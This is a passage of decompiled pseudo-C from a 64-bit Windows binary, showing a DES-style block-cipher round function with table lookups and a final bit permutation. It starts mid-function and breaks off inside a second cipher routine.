                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v25 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v24 ^ (unsigned __int64)a2[6]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v24 ^ (unsigned __int64)a2[6]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v25 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v24 ^ (unsigned __int64)a2[6]) >> 2) & 0x3F)) ^ v22;
    LODWORD(v18) = __ROR4__(v26 ^ a2[9], 4);
    v27 = *((_DWORD *)&unk_140111E00 + ((v26 ^ (unsigned __int64)a2[8]) >> 26) + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                        + ((unsigned __int64)(unsigned int)v18 >> 26)
                                                                                        + 448) ^ *((_DWORD *)&unk_140111E00
                                                                                                 + (((v26 ^ (unsigned __int64)a2[8]) >> 2) & 0x3F)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v18 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + (((unsigned int)v18 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + (((v26 ^ (unsigned __int64)a2[8]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v26 ^ (unsigned __int64)a2[8]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v18 >> 2) + 64) ^ v24;
    v28 = __ROR4__(v27 ^ a2[11], 4);
    v29 = v27 ^ (unsigned __int64)a2[10];
    v30 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v28 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v29 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v28 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v29 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v28 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v28 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v29 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v29 >> 18) & 0x3F) + 256) ^ v26;
    v31 = __ROR4__(v30 ^ a2[13], 4);
    v32 = v30 ^ (unsigned __int64)a2[12];
    v33 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v31 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v32 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v31 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v32 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v31 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v31 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v32 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v32 >> 18) & 0x3F) + 256) ^ v27;
    v34 = __ROR4__(v33 ^ a2[15], 4);
    v35 = v33 ^ (unsigned __int64)a2[14];
    v36 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v34 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v35 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v34 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v35 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v34 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v34 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v35 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v35 >> 18) & 0x3F) + 256) ^ v30;
    v37 = __ROR4__(v36 ^ a2[17], 4);
    v38 = v36 ^ (unsigned __int64)a2[16];
    v39 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v37 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v38 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v37 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v38 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v37 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v37 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v38 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v38 >> 18) & 0x3F) + 256) ^ v33;
    v40 = v39 ^ (unsigned __int64)a2[18];
    v41 = __ROR4__(v39 ^ a2[19], 4);
    v42 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v41 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v40 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v41 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v40 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v41 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v41 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v40 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v40 >> 18) & 0x3F) + 256) ^ v36;
    v43 = __ROR4__(v42 ^ a2[21], 4);
    v44 = v42 ^ (unsigned __int64)a2[20];
    v45 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v43 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v44 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v43 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v44 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v43 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v43 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v44 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v44 >> 18) & 0x3F) + 256) ^ v39;
    v46 = __ROR4__(v45 ^ a2[23], 4);
    v47 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v46 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v45 ^ (unsigned __int64)a2[22]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + (((v45 ^ (unsigned __int64)a2[22]) >> 10) & 0x3F)
                                                                                       + 128) ^ *((_DWORD *)&unk_140111E00
                                                                                                + (((v45 ^ (unsigned __int64)a2[22]) >> 18) & 0x3F)
                                                                                                + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v46 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v45 ^ (unsigned __int64)a2[22]) >> 2) & 0x3F)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v46 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v46 >> 18) & 0x3F) + 320) ^ v42;
    v48 = __ROR4__(v47 ^ a2[25], 4);
    v49 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v48 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v47 ^ (unsigned __int64)a2[24]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v48 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v48 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v47 ^ (unsigned __int64)a2[24]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v47 ^ (unsigned __int64)a2[24]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v48 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v47 ^ (unsigned __int64)a2[24]) >> 2) & 0x3F)) ^ v45;
    v50 = __ROR4__(v49 ^ a2[27], 4);
    v51 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v50 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v49 ^ (unsigned __int64)a2[26]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v50 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v50 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v49 ^ (unsigned __int64)a2[26]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v49 ^ (unsigned __int64)a2[26]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v50 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v49 ^ (unsigned __int64)a2[26]) >> 2) & 0x3F)) ^ v47;
    v52 = __ROR4__(v51 ^ a2[29], 4);
    v53 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v52 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v51 ^ (unsigned __int64)a2[28]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v52 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v52 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v51 ^ (unsigned __int64)a2[28]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v51 ^ (unsigned __int64)a2[28]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v52 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v51 ^ (unsigned __int64)a2[28]) >> 2) & 0x3F)) ^ v49;
    v54 = (unsigned int)__ROR4__(v53 ^ a2[31], 4);
    v55 = v53 ^ (unsigned __int64)a2[30];
    v56 = *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v54 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00
                                                                              + (((unsigned int)v54 >> 18) & 0x3F)
                                                                              + 320) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v55 >> 10)
                                                                                       + 128) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v55 >> 18) & 0x3F)
                                                                                                + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v54 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v55 >> 2));
  }
  else
  {
    v57 = v16 ^ (unsigned __int64)a2[30];
    v58 = __ROR4__(v16 ^ a2[31], 4);
    v59 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v58 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v57 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v58 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v58 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v57 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v57 >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v58 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v57 >> 2)) ^ v17;
    v60 = __ROR4__(v59 ^ a2[29], 4);
    v61 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v60 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v59 ^ (unsigned __int64)a2[28]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v60 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v60 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v59 ^ (unsigned __int64)a2[28]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v59 ^ (unsigned __int64)a2[28]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v60 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v59 ^ (unsigned __int64)a2[28]) >> 2) & 0x3F)) ^ v16;
    v62 = __ROR4__(v61 ^ a2[27], 4);
    v63 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v62 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v61 ^ (unsigned __int64)a2[26]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v62 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v62 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v61 ^ (unsigned __int64)a2[26]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v61 ^ (unsigned __int64)a2[26]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v62 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v61 ^ (unsigned __int64)a2[26]) >> 2) & 0x3F)) ^ v59;
    v64 = __ROR4__(v63 ^ a2[25], 4);
    v65 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v64 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v63 ^ (unsigned __int64)a2[24]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v64 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v64 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v63 ^ (unsigned __int64)a2[24]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v63 ^ (unsigned __int64)a2[24]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v64 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v63 ^ (unsigned __int64)a2[24]) >> 2) & 0x3F)) ^ v61;
    v66 = __ROR4__(v65 ^ a2[23], 4);
    v67 = v65 ^ (unsigned __int64)a2[22];
    v68 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v66 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v67 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v66 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v67 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v66 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v66 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v67 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v67 >> 18) & 0x3F) + 256) ^ v63;
    v69 = __ROR4__(v68 ^ a2[21], 4);
    v70 = v68 ^ (unsigned __int64)a2[20];
    v71 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v69 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v70 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v69 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v70 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v69 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v69 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v70 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v70 >> 18) & 0x3F) + 256) ^ v65;
    v72 = __ROR4__(v71 ^ a2[19], 4);
    v73 = v71 ^ (unsigned __int64)a2[18];
    v74 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v72 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v73 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v72 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v73 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v72 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v72 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v73 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v73 >> 18) & 0x3F) + 256) ^ v68;
    v75 = __ROR4__(v74 ^ a2[17], 4);
    v76 = v74 ^ (unsigned __int64)a2[16];
    v77 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v75 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v76 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v75 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v76 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v75 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v75 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v76 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v76 >> 18) & 0x3F) + 256) ^ v71;
    v78 = __ROR4__(v77 ^ a2[15], 4);
    v79 = v77 ^ (unsigned __int64)a2[14];
    v80 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v78 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v79 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v78 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v79 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v78 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v78 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v79 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v79 >> 18) & 0x3F) + 256) ^ v74;
    v81 = v80 ^ (unsigned __int64)a2[12];
    v82 = __ROR4__(v80 ^ a2[13], 4);
    v83 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v82 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v81 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v82 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v81 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v82 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v82 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v81 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v81 >> 18) & 0x3F) + 256) ^ v77;
    v84 = __ROR4__(v83 ^ a2[11], 4);
    v85 = v83 ^ (unsigned __int64)a2[10];
    v86 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v84 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v85 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v84 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v85 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v84 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v84 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v85 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v85 >> 18) & 0x3F) + 256) ^ v80;
    v87 = __ROR4__(v86 ^ a2[9], 4);
    v88 = v86 ^ (unsigned __int64)a2[8];
    v89 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v87 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v88 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v87 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v88 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v87 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v87 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v88 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v88 >> 18) & 0x3F) + 256) ^ v83;
    v90 = __ROR4__(v89 ^ a2[7], 4);
    v91 = v89 ^ (unsigned __int64)a2[6];
    v92 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v90 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v91 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v90 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v91 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v90 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v90 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v91 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v91 >> 18) & 0x3F) + 256) ^ v86;
    v93 = __ROR4__(v92 ^ a2[5], 4);
    v94 = v92 ^ (unsigned __int64)a2[4];
    v51 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v93 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v94 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v93 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v94 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v93 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v93 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v94 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v94 >> 18) & 0x3F) + 256) ^ v89;
    v95 = v51 ^ (unsigned __int64)a2[2];
    v96 = __ROR4__(v51 ^ a2[3], 4);
    v53 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v96 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v95 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v96 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v95 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v96 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v96 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v95 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v95 >> 18) & 0x3F) + 256) ^ v92;
    v54 = (unsigned int)__ROR4__(v53 ^ a2[1], 4);
    v55 = v53 ^ (unsigned __int64)*a2;
    v56 = *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v54 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00
                                                                           + ((unsigned __int8)v55 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v54 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + (((unsigned int)v54 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v55 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v55 >> 18) & 0x3F) + 256);
  }
  v97 = __ROR4__(v53, 3);
  v98 = __ROR4__(
          *((_DWORD *)&unk_140111E00 + (v54 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00 + (v55 >> 26) + 384) ^ v56 ^ v51,
          3);
  v99 = (v97 ^ (v98 >> 1)) & 0x55555555;
  v100 = v99 ^ v97;
  v101 = (2 * v99) ^ v98;
  v102 = (v101 ^ (v100 >> 8)) & 0xFF00FF;
  v103 = v102 ^ v101;
  v104 = (v102 << 8) ^ v100;
  v105 = (v104 ^ (v103 >> 2)) & 0x33333333;
  v106 = v105 ^ v104;
  v107 = (4 * v105) ^ v103;
  v108 = (unsigned __int16)(v107 ^ HIWORD(v106));
  v109 = v108 ^ v107;
  v110 = (v108 << 16) ^ v106;
  v111 = (v110 ^ (v109 >> 4)) & 0xF0F0F0F;
  v112 = v109 ^ (16 * v111);
  result = v110 ^ (unsigned int)v111;
  a1[1] = v112;
  *a1 = result;
  return result;
}

//----- (0000000140084620) ----------------------------------------------------
__int64 __fastcall sub_140084620(_DWORD *a1, unsigned int *a2, int a3)
{
  unsigned int v3; // r10d
  int v4; // r11d
  unsigned __int64 v5; // r8
  unsigned int v6; // r9d
  unsigned int v7; // r11d
  unsigned int v8; // r9d
  unsigned int v9; // r10d
  unsigned int v10; // r9d
  unsigned int v11; // r11d
  unsigned int v12; // r9d
  unsigned __int64 v13; // r8
  unsigned int v14; // r10d
  unsigned int v15; // r9d
  unsigned int v16; // r11d
  unsigned int v17; // r9d
  unsigned int v18; // r10d
  unsigned int v19; // r9d
  unsigned __int64 v20; // r8
  unsigned int v21; // r11d
  unsigned int v22; // r9d
  unsigned __int64 v23; // r8
  unsigned int v24; // r10d
  unsigned int v25; // r9d
  unsigned __int64 v26; // r8
  unsigned int v27; // r11d
  unsigned __int64 v28; // r8
  unsigned int v29; // r9d
  unsigned int v30; // r10d
  unsigned int v31; // r9d
  unsigned __int64 v32; // r8
  unsigned int v33; // r11d
  unsigned int v34; // r9d
  unsigned __int64 v35; // r8
  unsigned int v36; // r10d
  unsigned int v37; // r9d
  unsigned __int64 v38; // r8
  unsigned int v39; // r11d
  unsigned int v40; // r9d
  unsigned int v41; // r10d
  unsigned int v42; // r9d
  unsigned int v43; // r11d
  unsigned __int64 v44; // r9
  unsigned __int64 v45; // r8
  __int64 result; // rax
  int v47; // edx
  unsigned __int64 v48; // r8
  unsigned int v49; // r9d
  unsigned int v50; // r11d
  unsigned int v51; // r9d
  unsigned int v52; // r10d
  unsigned int v53; // r9d
  unsigned int v54; // r11d
  unsigned int v55; // r9d
  unsigned int v56; // r10d
  unsigned int v57; // r9d
  unsigned int v58; // r11d
  unsigned int v59; // r10d
  unsigned int v60; // r9d
  unsigned __int64 v61; // r8
  unsigned int v62; // r11d
  unsigned int v63; // r9d
  unsigned __int64 v64; // r8
  unsigned int v65; // r10d
  unsigned int v66; // r9d
  unsigned __int64 v67; // r8
  unsigned int v68; // r11d
  unsigned __int64 v69; // r8
  unsigned int v70; // r9d
  unsigned int v71; // r10d
  unsigned int v72; // r9d
  unsigned __int64 v73; // r8
  unsigned int v74; // r11d
  unsigned int v75; // r9d
  unsigned __int64 v76; // r8
  unsigned int v77; // r10d
  unsigned int v78; // r9d
  unsigned __int64 v79; // r8
  unsigned int v80; // r11d
  unsigned int v81; // r9d
  unsigned __int64 v82; // r8
  unsigned __int64 v83; // r8
  unsigned int v84; // r9d

  v3 = __ROR4__(*a1, 29);
  v4 = __ROR4__(a1[1], 29);
  if ( a3 )
  {
    v5 = v3 ^ (unsigned __int64)*a2;
    v6 = __ROR4__(v3 ^ a2[1], 4);
    v7 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v6 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00 + (v5 >> 26) + 384) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v6 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v5 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v5 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v5 >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v6 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v6 >> 18) & 0x3F) + 320) ^ v4;
    v8 = __ROR4__(v7 ^ a2[3], 4);
    v9 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v8 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                            + ((v7 ^ (unsigned __int64)a2[2]) >> 26)
                                                                            + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                     + (((v7 ^ (unsigned __int64)a2[2]) >> 10) & 0x3F)
